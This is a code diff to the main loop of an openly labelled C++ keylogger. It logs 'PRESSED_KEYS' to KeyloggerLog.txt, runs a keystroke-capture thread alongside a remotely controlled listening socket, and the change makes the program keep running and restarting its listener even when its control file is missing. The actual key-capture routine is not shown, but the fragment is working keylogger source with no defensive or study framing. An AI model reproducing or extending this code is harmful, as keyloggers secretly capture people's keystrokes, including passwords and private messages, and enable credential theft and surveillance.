@@ -17,18 +17,34 @@ void main(void)
 
 	out << endl; OutFullData(out); out << ". Keylogger was started."; out << endl << "\nPRESSED_KEYS: "; out.close();
 
-	bool stop = false, st;
+	bool stop = false;
+	int st = 0;
 
 	do {
 
 		pthread_create(&KLThread, NULL, Start, NULL);
-		pthread_create(&ListenSocket, NULL, ListenSocketProc, (void*)&stop);
+		pthread_create(&ListenSocket, NULL, ListenSocketProc, NULL);
 		pthread_join(ListenSocket, (void**)&st);
+
+		if (st == 2)
+		{
+			out.open("KeyloggerLog.txt", ios::app);
+			out << "Configuration file Kconfig.ksb is not found! Still working without control! "; OutFullData(out); out << endl;
+			out.close();
+
+			do {
+
+				pthread_create(&ListenSocket, NULL, ListenSocketProc, NULL);
+				pthread_join(ListenSocket, (void**)&st);
+
+			} while (st == 2);
+		}
 
 		stop = st;
 
-		pthread_kill(KLThread, 0);
-		pthread_kill(ListenSocket, 0);
-
 	} while (stop != true);
+
+	out.open("KeyloggerLog.txt", ios::app);
+	out << "Keylogger was stopped in "; OutFullData(out); out << endl;
+	out.close();
 }
